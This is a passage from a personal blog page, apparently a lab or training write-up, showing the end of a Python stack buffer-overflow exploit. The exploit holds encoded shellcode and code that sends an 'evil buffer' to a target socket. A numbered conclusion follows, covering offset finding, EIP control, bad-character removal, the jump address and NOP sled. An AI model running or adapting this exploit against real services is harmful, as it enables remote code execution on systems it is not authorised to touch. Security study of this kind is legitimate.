+<span class="token string">"\xec\x1c\x3f\x34\xe2\xe9\x4b\x12\xe7\xec\x98\x29\x13\x64"</span>
+<span class="token string">"\x1f\xfd\x95\x3e\x04\xd9\xfe\xe5\x25\x78\x5b\x4b\x59\x9a"</span>
+<span class="token string">"\x04\x34\xff\xd1\xa9\x21\x72\xb8\xa5\x86\xbf\x42\x36\x81"</span>
+<span class="token string">"\xc8\x31\x04\x0e\x63\xdd\x24\xc7\xad\x1a\x4a\xf2\x0a\xb4"</span>
+<span class="token string">"\xb5\xfd\x6a\x9d\x71\xa9\x3a\xb5\x50\xd2\xd0\x45\x5c\x07"</span>
+<span class="token string">"\x76\x15\xf2\xf8\x37\xc5\xb2\xa8\xdf\x0f\x3d\x96\xc0\x30"</span>
+<span class="token string">"\x97\xbf\x6b\xcb\x70\xca\x63\xe1\x27\xa2\x71\x05\x3a\xc3"</span>
+<span class="token string">"\xff\xe3\x50\x33\x56\xbc\xcc\xaa\xf3\x36\x6c\x32\x2e\x33"</span>
+<span class="token string">"\xae\xb8\xdd\xc4\x61\x49\xab\xd6\x16\xb9\xe6\x84\xb1\xc6"</span>
+<span class="token string">"\xdc\xa0\x5e\x54\xbb\x30\x28\x45\x14\x67\x7d\xbb\x6d\xed"</span>
+<span class="token string">"\x93\xe2\xc7\x13\x6e\x72\x2f\x97\xb5\x47\xae\x16\x3b\xf3"</span>
+<span class="token string">"\x94\x08\x85\xfc\x90\x7c\x59\xab\x4e\x2a\x1f\x05\x21\x84"</span>
+<span class="token string">"\xc9\xfa\xeb\x40\x8f\x30\x2c\x16\x90\x1c\xda\xf6\x21\xc9"</span>
+<span class="token string">"\x9b\x09\x8d\x9d\x2b\x72\xf3\x3d\xd3\xa9\xb7\x5e\x36\x7b"</span>
+<span class="token string">"\xc2\xf6\xef\xee\x6f\x9b\x0f\xc5\xac\xa2\x93\xef\x4c\x51"</span>
+<span class="token string">"\x8b\x9a\x49\x1d\x0b\x77\x20\x0e\xfe\x77\x97\x2f\x2b\x77"</span>
+<span class="token string">"\x17\xd0\xd4"</span><span class="token punctuation">)</span>
+
+postfix <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token builtin">buffer</span> <span class="token operator">=</span> prefix <span class="token operator">+</span> overflow <span class="token operator">+</span> retn <span class="token operator">+</span> padding <span class="token operator">+</span> payload <span class="token operator">+</span> postfix
+
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+  s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Sending evil buffer..."</span><span class="token punctuation">)</span>
+  s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">buffer</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"latin-1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span><span class="token punctuation">:</span>
+  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect."</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/ymLYsRO.png"></p>
+<p>Indeed, it’s better when I use rhe right tools.</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><ul>
+<li><ol>
+<li>Find where it’s craching (aproximatively)</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>remove 200 chars, add 300 ofset to locate where in the ofset it’s crashing</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>Add BBBB to be sure I’m at the EIP.</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>Generate bytearray with mona and Inject the same after BBBB with the script (not working with bash)</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>Find the bad chars</li>
+</ol>
+</li>
+<li><ol start="6">
+<li>Find the jump</li>
+</ol>
+</li>
+<li><ol start="7">
+<li>Create the payload without the BadChars</li>
+</ol>
+</li>
+<li><ol start="8">
+<li>add the jpm Value in EIP, the NOPS then the payload</li>
+</ol>
+</li>
+</ul>
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2021 Peanutstick&#39;s Blog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
